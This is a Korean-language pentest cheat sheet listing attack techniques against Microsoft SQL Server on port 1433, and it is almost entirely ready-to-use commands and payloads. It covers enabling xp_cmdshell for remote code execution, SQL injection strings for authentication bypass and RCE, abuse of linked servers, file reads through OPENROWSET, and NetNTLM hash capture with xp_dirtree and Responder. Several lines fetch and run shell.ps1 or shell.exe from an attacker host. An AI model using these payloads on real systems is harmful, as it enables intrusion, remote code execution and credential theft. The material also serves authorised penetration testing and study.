---
sidebar_position: 3
---

# MSSQL - 1433 (Microsoft SQL Server)

Microsoft SQL Server 연결 및 공격 기법 모음입니다.

## 연결 방법

### sqlcmd (Windows 네이티브)

```bash
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>' -d <DATABASE>
```

### impacket-mssqlclient

```bash
# 기본 연결
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST>

# Windows 인증
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth

# Kerberos 인증
impacket-mssqlclient -k -no-pass <RHOST>
```

### Kerberos 티켓 사용

```bash
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

## impacket-mssqlclient 유용한 명령어

```bash
SQL> enum_logins          # 로그인 계정 열거
SQL> enum_impersonate     # 가장 가능한 계정 열거
```

## 기본 SQL 명령어

### 버전 및 정보 확인

```sql
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DB_NAME();
```

### 데이터베이스 열거

```sql
SELECT name FROM sys.databases;
SELECT name FROM master.sys.databases;
```

### 테이블 열거

```sql
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT name FROM <DATABASE>.sys.tables;
```

### 데이터 조회

```sql
SELECT * FROM <DATABASE>.dbo.users;
SELECT * FROM <DATABASE>.dbo.<TABLE>;
```

### 사용자 및 권한 확인

```sql
SELECT name,sysadmin FROM syslogins;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Linked SQL Server

### 링크 서버 열거

```sql
SELECT srvname,isremote FROM sysservers;
EXEC sp_linkedservers;
```

### 링크 서버를 통한 명령 실행

```sql
EXEC ('SELECT current_user') at [<DOMAIN>\\<CONFIG_FILE>];
EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\\<CONFIG_FILE>];
EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\\<CONFIG_FILE>]') at [<DOMAIN>\\<CONFIG_FILE>];
```

### OPENQUERY

```sql
select * from openquery("web\\clients", 'select name from master.sys.databases');
select * from openquery("web\\clients", 'select name from clients.sys.objects');
```

## xp_cmdshell (RCE)

### 활성화

#### 방법 1

```sql
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### 방법 2

```sql
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### 방법 3 (impacket)

```sql
enable_xp_cmdshell
```

### 명령 실행

```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<LHOST>/shell.ps1'')"';
xp_cmdshell whoami
```

### SQL Injection을 통한 xp_cmdshell

```sql
'; EXEC master.dbo.xp_cmdshell 'ping <LHOST>'; --
'; EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\\temp\\shell.exe'; --
'; EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe'; --
```

## 파일 읽기/쓰기

### OPENROWSET으로 파일 읽기

```sql
SELECT * FROM OPENROWSET(BULK 'C:\\PATH\\TO\\FILE\\file.txt', SINGLE_CLOB) AS x;
SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS x;
```

### Binary 추출 (Base64)

```sql
select cast((select content from openquery([web\\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
go > export.txt
```

## NetNTLM Hash 탈취

### xp_dirtree를 사용한 해시 캡처

```sql
EXEC master.dbo.xp_dirtree '\\<LHOST>\\share';
EXEC master.dbo.xp_dirtree '\\<LHOST>\\FOOBAR';
```

Responder로 해시 캡처:

```bash
sudo responder -I tun0
```

## SQL Injection 예제

### 인증 우회

```sql
' or 1=1--
admin' or 1=1--
' or '1'='1'--
```

### Time-Based Injection

```sql
' SELECT @@version; WAITFOR DELAY '00:00:10'; --
```

### UNION 기반 Injection

```sql
' UNION SELECT null, @@version, null--
' UNION SELECT 1, database(), user()--
```

### xp_cmdshell 활성화 (Injection)

```sql
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### RCE (Injection)

```sql
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')" ;--
```

## 참고

- MSSQL은 기본적으로 1433 포트 사용
- xp_cmdshell은 보안상 기본적으로 비활성화
- sysadmin 권한이 있어야 xp_cmdshell 활성화 가능
- Linked Server를 통한 권한 상승 가능
- NetNTLM 해시 릴레이 공격에 취약
- Windows 인증 사용 시 도메인 자격증명 필요
